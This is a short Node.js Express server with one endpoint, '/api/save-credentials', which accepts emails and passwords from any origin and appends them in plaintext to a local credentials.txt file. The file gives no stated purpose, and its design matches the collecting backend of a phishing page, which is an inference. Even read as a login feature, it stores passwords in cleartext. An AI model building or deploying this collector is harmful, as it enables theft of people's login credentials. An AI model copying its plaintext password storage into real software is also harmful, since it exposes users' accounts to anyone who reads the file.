const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());  // Allow cross-origin requests from frontend
app.use(express.json()); // Parse JSON bodies

app.post('/api/save-credentials', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password required' });
  }

  const entry = `Email: ${email}, Password: ${password}\n`;
  fs.appendFile(path.join(__dirname, 'credentials.txt'), entry, (err) => {
    if (err) {
      console.error('Error saving credentials:', err);
      return res.status(500).json({ error: 'Failed to save data' });
    }
    res.json({ success: true, message: 'Credentials saved' });
  });
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
